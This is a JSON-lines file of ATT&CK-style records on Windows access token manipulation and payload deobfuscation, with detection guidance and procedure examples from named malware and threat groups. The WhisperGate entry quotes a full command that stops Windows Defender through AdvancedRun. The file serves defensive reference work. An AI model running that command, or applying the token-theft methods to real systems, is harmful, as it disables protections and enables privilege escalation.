{"technique_id":"T1134.001","technique_name":"Access Token Manipulation: Token Impersonation/Theft","description":"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread. An adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system. When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. Analysts can also monitor for use of Windows APIs such as DuplicateToken(Ex), ImpersonateLoggedOnUser , and SetThreadToken and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","procedures":["[S0182] FinFisher: FinFisher uses token manipulation with NtFilterToken as part of UAC bypass.","[S0367] Emotet: Emotet has the ability to duplicate the user’s token. For example, Emotet may use a variant of Google’s ProtoBuf to send messages that specify how code will be executed.","[S0603] Stuxnet: Stuxnet attempts to impersonate an anonymous token to enumerate bindings in the service control manager.","[C0038] HomeLand Justice: During HomeLand Justice, threat actors used custom tooling to acquire tokens using `ImpersonateLoggedOnUser/SetThreadToken`.","[S0154] Cobalt Strike: Cobalt Strike can steal access tokens from exiting processes.","[S1011] Tarrask: Tarrask leverages token theft to obtain `lsass.exe` security permissions.","[S0692] SILENTTRINITY: SILENTTRINITY can find a process owned by a specific user and impersonate the associated token.","[S0570] BitPaymer: BitPaymer can use the tokens of users to create processes on infected systems.","[S0140] Shamoon: Shamoon can impersonate tokens using LogonUser, ImpersonateLoggedOnUser, and ImpersonateNamedPipeClient.","[S0439] Okrum: Okrum can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API.","[S0456] Aria-body: Aria-body has the ability to duplicate a token from ntprint.exe.","[G0007] APT28: APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.","[S0496] REvil: REvil can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.","[S0192] Pupy: Pupy can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.","[S1081] BADHATCH: BADHATCH can impersonate a `lsass.exe` or `vmtoolsd.exe` token.","[S0623] Siloscape: Siloscape impersonates the main thread of CExecSvc.exe by calling NtImpersonateThread.","[G0061] FIN8: FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1134.002","technique_name":"Access Token Manipulation: Create Process with Token","description":"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas. Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process. While this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.","detection":"If an adversary is using a standard command-line shell (i.e. Windows Command Shell), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command or similar artifacts. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior. Analysts can also monitor for use of Windows APIs such as CreateProcessWithTokenW and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","procedures":["[S0344] Azorult: Azorult can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges.","[G0010] Turla: Turla RPC backdoors can impersonate or steal process tokens before executing commands.","[S0501] PipeMon: PipeMon can attempt to gain administrative privileges using token impersonation.","[G0032] Lazarus Group: Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.","[S0378] PoshC2: PoshC2 can use Invoke-RunAs to make tokens.","[S0456] Aria-body: Aria-body has the ability to execute a process using runas.","[S0496] REvil: REvil can launch an instance of itself with administrative rights using runas.","[S0412] ZxShell: ZxShell has a command called RunAs, which creates a new process as another user or process context.","[S0689] WhisperGate: The WhisperGate third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via `%TEMP%\\AdvancedRun.exe\" /EXEFilename \"C:\\Windows\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run`.","[S0356] KONNI: KONNI has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.","[S0239] Bankshot: Bankshot grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.","[S0363] Empire: Empire can use Invoke-RunAs to make tokens."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1134.003","technique_name":"Access Token Manipulation: Make and Impersonate Token","description":"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread. This behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. Analysts can also monitor for use of Windows APIs such as LogonUser and SetThreadToken and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","procedures":["[S1060] Mafalda: Mafalda can create a token for a different user.","[G1043] BlackByte: BlackByte constructed a valid authentication token following Microsoft Exchange exploitation to allow for follow-on privileged command execution.","[G1016] FIN13: FIN13 has utilized tools such as Incognito V2 for token manipulation and impersonation.","[S0692] SILENTTRINITY: SILENTTRINITY can make tokens from known credentials.","[S0154] Cobalt Strike: Cobalt Strike can make tokens from known credentials."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1134.004","technique_name":"Access Token Manipulation: Parent PID Spoofing","description":"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context. Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API. Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.","detection":"Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process. Monitor and analyze API calls to CreateProcess/CreateProcessA, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information). Malicious use of CreateProcess/CreateProcessA may also be proceeded by a call to UpdateProcThreadAttribute, which may be necessary to update process creation attributes. This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.","procedures":["[S0356] KONNI: KONNI has used parent PID spoofing to spawn a new `cmd` process using `CreateProcessW` and a handle to `Taskmgr.exe`.","[S0154] Cobalt Strike: Cobalt Strike can spawn processes with alternate PPIDs.","[S0501] PipeMon: PipeMon can use parent PID spoofing to elevate privileges.","[S1111] DarkGate: DarkGate relies on parent PID spoofing as part of its \"rootkit-like\" functionality to evade detection via Task Manager or Process Explorer."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1134.005","technique_name":"Access Token Manipulation: SID-History Injection","description":"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens). With Domain Administrator (or equivalent) rights, harvested or well-known SID values may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.","detection":"Examine data in user’s SID-History attributes using the PowerShell Get-ADUser cmdlet , especially users who have SID-History values from the same domain. Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. Monitor for Windows API calls to the DsAddSidHistory function.","procedures":["[S0002] Mimikatz: Mimikatz's MISC::AddSid module can append any SID or user/group account to a user's SID-History. Mimikatz also utilizes SID-History Injection to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.","[S0363] Empire: Empire can add a SID-History to a user if on a domain controller."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1140","technique_name":"Deobfuscate/Decode Files or Information","description":"Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b or type command to reassemble binary fragments into a malicious payload. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.","detection":"Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as certutil. Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.","procedures":["[C0044] Juicy Mix: During Juicy Mix, OilRig used a script to concatenate and deobfuscate encoded strings in Mango.","[S0230] ZeroT: ZeroT shellcode decrypts and decompresses its RC4-encrypted payload.","[S0584] AppleJeus: AppleJeus has decoded files received from a C2.","[S1028] Action RAT: Action RAT can use Base64 to decode actor-controlled C2 server communications.","[G0060] BRONZE BUTLER: BRONZE BUTLER downloads encoded payloads and decodes them on the victim.","[S0669] KOCTOPUS: KOCTOPUS has deobfuscated itself before executing its commands.","[S1086] Snip3: Snip3 can decode its second-stage PowerShell script prior to execution.","[S0574] BendyBear: BendyBear has decrypted function blocks using a XOR key during runtime to evade detection.","[S0513] LiteDuke: LiteDuke has the ability to decrypt and decode multiple layers of obfuscation.","[S0598] P.A.S. Webshell: P.A.S. Webshell can use a decryption mechanism to process a user supplied password and allow execution.","[S0356] KONNI: KONNI has used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process.","[G0010] Turla: Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads.","[S0409] Machete: Machete’s downloaded data is decrypted using AES.","[S0415] BOOSTWRITE: BOOSTWRITE has used a a 32-byte long multi-XOR key to decode data inside its payload.","[S1202] LockBit 3.0: The LockBit 3.0 payload is decrypted at runtime.","[G0087] APT39: APT39 has used malware to decrypt encrypted CAB files.","[S1078] RotaJakiro: RotaJakiro uses the AES algorithm, bit shifts in a function called `rotate`, and an XOR cipher to decrypt resources required for persistence, process guarding, and file locking. It also performs this same function on encrypted stack strings and the `head` and `key` sections in the network packet structure used for C2 communications.","[S0284] More_eggs: More_eggs will decode malware components that are then dropped to the system.","[S1066] DarkTortilla: DarkTortilla can decrypt its payload and associated configuration elements using the Rijndael cipher.","[S0666] Gelsemium: Gelsemium can decompress and decrypt DLLs and shellcode.","[S0226] Smoke Loader: Smoke Loader deobfuscates its code.","[S1122] Mispadu: Mispadu decrypts its encrypted configuration files prior to execution.","[S0611] Clop: Clop has used a simple XOR operation to decrypt strings.","[S0461] SDBbot: SDBbot has the ability to decrypt and decompress its payload to enable code execution.","[S0638] Babuk: Babuk has the ability to unpack itself into memory using XOR.","[S0127] BBSRAT: BBSRAT uses Expand to decompress a CAB file into executable content.","[S0663] SysUpdate: SysUpdate can deobfuscate packed binaries in memory.","[S0447] Lokibot: Lokibot has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.","[S0223] POWERSTATS: POWERSTATS can deobfuscate the main backdoor code.","[S0269] QUADAGENT: QUADAGENT uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.","[G0090] WIRTE: WIRTE has used Base64 to decode malicious VBS script.","[S0636] VaporRage: VaporRage can deobfuscate XOR-encoded shellcode prior to execution.","[G0078] Gorgon Group: Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file.","[S1164] UPSTYLE: UPSTYLE encodes its main content prior to loading via Python as base64-encoded blobs.","[G0094] Kimsuky: Kimsuky has decoded malicious VBScripts using Base64.","[S0532] Lucifer: Lucifer can decrypt its C2 address upon execution.","[S0640] Avaddon: Avaddon has decrypted encrypted strings.","[S1186] Line Dancer: Line Dancer shellcode payloads are base64 encoded when transmitted to compromised devices.","[S0615] SombRAT: SombRAT can run upload to decrypt and upload files from storage.","[G1036] Moonstone Sleet: Moonstone Sleet delivered payloads using multiple rounds of obfuscation and encoding to evade defenses and analysis.","[S1026] Mongall: Mongall has the ability to decrypt its payload prior to execution.","[S1115] WIREFIRE: WIREFIRE can decode, decrypt, and decompress data received in C2 HTTP `POST` requests.","[S0661] FoggyWeb: FoggyWeb can be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key.","[S0434] Imminent Monitor: Imminent Monitor has decoded malware components that are then dropped to the system.","[C0005] Operation Spalax: For Operation Spalax, the threat actors used a variety of packers and droppers to decrypt malicious payloads.","[S1113] RAPIDPULSE: RAPIDPULSE listens for specific HTTP query parameters in received communications. If specific parameters match, a hard-coded RC4 key is used to decrypt the HTTP query paremter hmacTime. This decrypts to a filename that is then open, read, encrypted with the same RC4 key, base64-encoded, written to standard out, then passed as a response to the HTTP request.","[S0456] Aria-body: Aria-body has the ability to decrypt the loader configuration and payload DLL.","[S0596] ShadowPad: ShadowPad has decrypted a binary blob to start execution.","[S1076] QUIETCANARY: QUIETCANARY can use a custom parsing routine to decode the command codes and additional parameters from the C2 before executing them.","[S0188] Starloader: Starloader decrypts and executes shellcode from a file called Stars.jps.","[S0436] TSCookie: TSCookie has the ability to decrypt, load, and execute a DLL and its resources.","[S0575] Conti: Conti has decrypted its payload using a hardcoded AES-256 key.","[S0236] Kwampirs: Kwampirs decrypts and extracts a copy of its main DLL payload when executing.","[S0629] RainyDay: RainyDay can decrypt its payload via a XOR key.","[S0255] DDKONG: DDKONG decodes an embedded configuration using XOR.","[S0361] Expand: Expand can be used to decompress a local or remote CAB file into an executable.","[S0354] Denis: Denis will decrypt important strings used for C&C communication.","[S1039] Bumblebee: Bumblebee can deobfuscate C2 server responses and unpack its code on targeted hosts.","[G1030] Agrius: Agrius has deployed base64-encoded variants of ASPXSpy to evade detection.","[S0355] Final1stspy: Final1stspy uses Python code to deobfuscate base64-encoded strings.","[G0004] Ke3chang: Ke3chang has deobfuscated Base64-encoded shellcode strings prior to loading them.","[S0635] BoomBox: BoomBox can decrypt AES-encrypted files downloaded from C2.","[S1041] Chinoxy: The Chinoxy dropping function can initiate decryption of its config file.","[S0344] Azorult: Azorult uses an XOR key to decrypt content and uses Base64 to decode the C2 address.","[S0373] Astaroth: Astaroth uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code.","[S0650] QakBot: QakBot can deobfuscate and re-assemble code strings for execution.","[S1142] LunarMail: LunarMail can decrypt strings to retrieve configuration settings.","[S0603] Stuxnet: Stuxnet decrypts resources that are loaded into memory and executed.","[S0457] Netwalker: Netwalker's PowerShell script can decode and decrypt multiple layers of obfuscation, leading to the Netwalker DLL being loaded into memory.","[S1213] Lumma Stealer: Lumma Stealer has used Base64-encoded content during execution, decoded via PowerShell.","[S1030] Squirrelwaffle: Squirrelwaffle has decrypted files and payloads using a XOR-based algorithm.","[S0622] AppleSeed: AppleSeed can decode its payload prior to execution.","[S0469] ABK: ABK has the ability to decrypt AES encrypted payloads.","[S0264] OopsIE: OopsIE concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.","[G0082] APT38: APT38 has used the RC4 algorithm to decrypt configuration data.","[G1017] Volt Typhoon: Volt Typhoon has used Base64-encoded data to transfer payloads and commands, including deobfuscation via certutil.","[S1051] KEYPLUG: KEYPLUG can decode its configuration file to determine C2 protocols.","[S1119] LIGHTWIRE: LIGHTWIRE can RC4 decrypt and Base64 decode C2 commands.","[S0430] Winnti for Linux: Winnti for Linux has decoded XOR encoded strings holding its configuration upon execution.","[S0674] CharmPower: CharmPower can decrypt downloaded modules prior to execution.","[S0377] Ebury: Ebury has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.","[S1060] Mafalda: Mafalda can decrypt files and data.","[G0021] Molerats: Molerats decompresses ZIP files once on the victim machine.","[S0268] Bisonal: Bisonal has decoded strings in the malware using XOR and RC4.","[C0017] C0017: During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads.","[G0012] Darkhotel: Darkhotel has decrypted strings and imports using RC4 during execution.","[S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D uses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. This routine is also referenced as the `rotate` function in reporting.","[S1032] PyDCrypt: PyDCrypt has decrypted and dropped the DCSrv payload to disk.","[S0448] Rising Sun: Rising Sun has decrypted itself using a single-byte XOR scheme. Additionally, Rising Sun can decrypt its configuration data at runtime.","[S0115] Crimson: Crimson can decode its encoded PE file prior to execution.","[S0678] Torisma: Torisma has used XOR and Base64 to decode C2 data.","[S1027] Heyoka Backdoor: Heyoka Backdoor can decrypt its payload prior to execution.","[G1006] Earth Lusca: Earth Lusca has used certutil to decode a string into a cabinet file.","[S0667] Chrommme: Chrommme can decrypt its encrypted internal code.","[S0239] Bankshot: Bankshot decodes embedded XOR strings.","[S0257] VERMIN: VERMIN decrypts code, strings, and commands to use once it's on the victim's machine.","[S0395] LightNeuron: LightNeuron has used AES and XOR to decrypt configuration files and commands.","[S0487] Kessel: Kessel has decrypted the binary's configuration once the main function was launched.","[S1117] GLASSTOKEN: GLASSTOKEN has the ability to decode hexadecimal and Base64 C2 requests.","[S0189] ISMInjector: ISMInjector uses the certutil command to decode a payload file.","[G1046] Storm-1811: Storm-1811 has distributed password-protected archives such as ZIP files during intrusions.","[S1085] Sardonic: Sardonic can first decrypt with the RC4 algorithm using a hardcoded decryption key before decompressing.","[G0128] ZIRCONIUM: ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.","[G0069] MuddyWater: MuddyWater has decoded base64-encoded PowerShell, JavaScript, and VBScript.","[S0160] certutil: certutil has been used to decode binaries hidden inside certificate files as Base64 information.","[S1059] metaMain: metaMain can decrypt and load other modules.","[S1179] Exbyte: Exbyte decodes and decrypts data stored in the configuration file with a key provided on the command line during execution.","[S1160] Latrodectus: Latrodectus has the ability to deobfuscate encrypted strings.","[S0011] Taidoor: Taidoor can use a stream cipher to decrypt stings used by the malware.","[S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can use an embedded RC4 key to decrypt Windows API function strings.","[S1168] SampleCheck5000: SampleCheck5000 can decode and decrypt command line strings and files received through C2.","[S1141] LunarWeb: LunarWeb can decrypt strings related to communication configuration using RC4 with a static key.","[S1110] SLIGHTPULSE: SLIGHTPULSE can deobfuscate base64 encoded and RC4 encrypted C2 messages.","[S0495] RDAT: RDAT can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.","[S1153] Cuckoo Stealer: Cuckoo Stealer strings are deobfuscated prior to execution.","[S0554] Egregor: Egregor has been decrypted before execution.","[G0049] OilRig: A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims.","[S1212] RansomHub: RansomHub can use a provided passphrase to decrypt its configuration file.","[S1159] DUSTTRAP: DUSTTRAP deobfuscates embedded payloads.","[S0634] EnvyScout: EnvyScout can deobfuscate and write malicious ISO files to disk.","[S0482] Bundlore: Bundlore has used openssl to decrypt AES encrypted payload data. Bundlore has also used base64 and RC4 with a hardcoded key to deobfuscate data.","[S0398] HyperBro: HyperBro can unpack and decrypt its payload prior to execution.","[S0024] Dyre: Dyre decrypts resources needed for targeting the victim.","[S0579] Waterbear: Waterbear has the ability to decrypt its RC4 encrypted payload for execution.","[S0386] Ursnif: Ursnif has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.","[S0401] Exaramel for Linux: Exaramel for Linux can decrypt its configuration file.","[S1150] ROADSWEEP: ROADSWEEP can decrypt embedded scripts prior to execution.","[S0473] Avenger: Avenger has the ability to decrypt files downloaded from C2.","[C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware.","[C0051] APT28 Nearest Neighbor Campaign: During APT28 Nearest Neighbor Campaign, APT28 unarchived data using the GUI version of WinRAR.","[S1053] AvosLocker: AvosLocker has deobfuscated XOR-encoded strings.","[S0388] YAHOYAH: YAHOYAH decrypts downloaded files before execution.","[S1199] LockBit 2.0: LockBit 2.0 can decode scripts and strings in loaded modules.","[S1022] IceApple: IceApple can use a Base64-encoded AES key to decrypt tasking.","[S0470] BBK: BBK has the ability to decrypt AES encrypted payloads.","[S0263] TYPEFRAME: One TYPEFRAME variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\".","[S1100] Ninja: The Ninja loader component can decrypt and decompress the payload.","[S1210] Sagerunex: Sagerunex uses a custom decryption routine to unpack itself during installation.","[S1143] LunarLoader: LunarLoader can deobfuscate files containing the next stages in the infection chain.","[S0147] Pteranodon: Pteranodon can decrypt encrypted data strings prior to using them.","[S1047] Mori: Mori can resolve networking APIs from strings that are ADD-encrypted.","[S0367] Emotet: Emotet has used a self-extracting RAR file to deliver modules to victims. Emotet has also extracted embedded executables from files using hard-coded buffer offsets.","[S0670] WarzoneRAT: WarzoneRAT can use XOR 0x45 to decrypt obfuscated code.","[S1063] Brute Ratel C4: Brute Ratel C4 has the ability to deobfuscate its payload prior to execution.","[S0690] Green Lambert: Green Lambert can use multiple custom routines to decrypt strings prior to execution.","[S0279] Proton: Proton uses an encrypted file to store commands and configuration values.","[S1138] Gootloader: Gootloader has the ability to decode and decrypt malicious payloads prior to execution.","[S1139] INC Ransomware: INC Ransomware can run `CryptStringToBinaryA` to decrypt base64 content containing its ransom note.","[S0641] Kobalos: Kobalos decrypts strings right after the initial communication, but before the authentication process.","[S0414] BabyShark: BabyShark has the ability to decode downloaded files prior to execution.","[S0335] Carbon: Carbon decrypts task and configuration files for execution.","[S0697] HermeticWiper: HermeticWiper can decompress and copy driver files using `LZCopy`.","[S0375] Remexi: Remexi decrypts the configuration data using XOR with 25-character keys.","[S0032] gh0st RAT: gh0st RAT has decrypted and loaded the gh0st RAT DLL into memory, once the initial dropper executable is launched.","[G0047] Gamaredon Group: Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader. Additionally, Gamaredon Group has decoded Telegram content to reveal the IP address for C2 communications.","[S1065] Woody RAT: Woody RAT can deobfuscate Base64-encoded strings and scripts.","[S0402] OSX/Shlayer: OSX/Shlayer can base64-decode and AES-decrypt downloaded payloads. Versions of OSX/Shlayer pass encrypted and password-protected code to openssl and then write the payload to the /tmp folder.","[S1050] PcShare: PcShare has decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm.","[G0092] TA505: TA505 has decrypted packed DLLs with an XOR key.","[S0492] CookieMiner: CookieMiner has used Google Chrome's decryption and extraction operations.","[S0547] DropBook: DropBook can unarchive data downloaded from the C2 to obtain the payload and persistence modules.","[S0511] RegDuke: RegDuke can decrypt strings with a key either stored in the Registry or hardcoded in the code.","[S0140] Shamoon: Shamoon decrypts ciphertext using an XOR cipher and a base64-encoded string.","[G0027] Threat Group-3390: During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.","[G0007] APT28: An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.","[S1158] DUSTPAN: DUSTPAN decodes and decrypts embedded payloads.","[S1097] HUI Loader: HUI Loader can decrypt and load files containing malicious payloads.","[S0468] Skidmap: Skidmap has the ability to download, unpack, and decrypt tar.gz files .","[S0240] ROKRAT: ROKRAT can decrypt strings using the victim's hostname as the key.","[S0623] Siloscape: Siloscape has decrypted the password of the C2 server with a simple byte by byte XOR. Siloscape also writes both an archive of Tor and the unzip binary to disk from data embedded within the payload using Visual Studio’s Resource Manager.","[S0443] MESSAGETAP: After checking for the existence of two files, keyword_parm.txt and parm.txt, MESSAGETAP XOR decodes and read the contents of the files.","[S0444] ShimRat: ShimRat has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.","[S0502] Drovorub: Drovorub has de-obsfuscated XOR encrypted payloads in WebSocket messages.","[S0588] GoldMax: GoldMax has decoded and decrypted the configuration file when executed.","[S0576] MegaCortex: MegaCortex has used a Base64 key to decode its components.","[G0139] TeamTNT: TeamTNT has used a script that decodes a Base64-encoded version of WeaveWorks Scope.","[G1035] Winter Vivern: Winter Vivern delivered exploit payloads via base64-encoded payloads in malicious email messages.","[S0681] Lizar: Lizar can decrypt its configuration data.","[S0647] Turian: Turian has the ability to use a XOR decryption key to extract C2 server domains and IP addresses.","[S0610] SideTwist: SideTwist can decode and decrypt messages received from C2.","[S0496] REvil: REvil can decode encrypted strings to enable execution of commands and payloads.","[S0331] Agent Tesla: Agent Tesla has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.","[S1016] MacMa: MacMa decrypts a downloaded file using AES-128-EBC with a custom delta.","[S1052] DEADEYE: DEADEYE has the ability to combine multiple sections of a binary which were broken up to evade detection into a single .dll prior to execution.","[S0515] WellMail: WellMail can decompress scripts received from C2.","[C0021] C0021: During C0021, the threat actors deobfuscated encoded PowerShell commands including use of the specific string `'FromBase'+0x40+'String'`, in place of `FromBase64String` which is normally used to decode base64.","[S0369] CoinTicker: CoinTicker decodes the initially-downloaded hidden encoded file using OpenSSL.","[S0673] DarkWatchman: DarkWatchman has the ability to self-extract as a RAR archive.","[S0546] SharpStage: SharpStage has decompressed data received from the C2 server.","[G0045] menuPass: menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim’s machine when dropping UPPERCUT.","[S1111] DarkGate: DarkGate installation includes binary code stored in a file located in a hidden directory, such as shell.txt, that is decrypted then executed. DarkGate uses hexadecimal-encoded shellcode payloads during installation that are called via Windows API CallWindowProc() to decode and then execute.","[S1134] DEADWOOD: DEADWOOD XORs some strings within the binary using the value 0xD5, and deobfuscates these items at runtime.","[S0589] Sibot: Sibot can decrypt data received from a C2 and save to a file.","[S0637] NativeZone: NativeZone can decrypt and decode embedded Cobalt Strike beacon stage shellcode.","[S0517] Pillowmint: Pillowmint has been decompressed by included shellcode prior to being launched.","[G0032] Lazarus Group: Lazarus Group has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.","[S0601] Hildegard: Hildegard has decrypted ELF files with AES.","[S0126] ComRAT: ComRAT has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module. ComRAT has also used a unique password to decrypt the file used for its hidden file system.","[S0531] Grandoreiro: Grandoreiro can decrypt its encrypted internal strings.","[S0660] Clambling: Clambling can deobfuscate its payload prior to execution.","[S0266] TrickBot: TrickBot decodes the configuration data and modules.","[S0618] FIVEHANDS: FIVEHANDS has the ability to decrypt its payload prior to execution.","[S1190] Kapeka: Kapeka utilizes obfuscated JSON structures for various data storage and configuration management items.","[S1018] Saint Bot: Saint Bot can deobfuscate strings and files for execution.","[S0154] Cobalt Strike: Cobalt Strike can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.","[S1019] Shark: Shark can extract and decrypt downloaded .zip files.","[S0581] IronNetInjector: IronNetInjector has the ability to decrypt embedded .NET and PE payloads.","[S0543] Spark: Spark has used a custom XOR algorithm to decrypt the payload.","[G1043] BlackByte: BlackByte has encoded commands in base64-encoded sections concatenated together in PowerShell. BlackByte uses PowerShell commands to disable Windows Defender.","[S0439] Okrum: Okrum's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.","[S0466] WindTail: WindTail has the ability to decrypt strings using hard-coded AES keys.","[S1207] XLoader: XLoader uses XOR and RC4 algorithms to decrypt payloads and functions. XLoader can be distributed as a self-extracting RAR 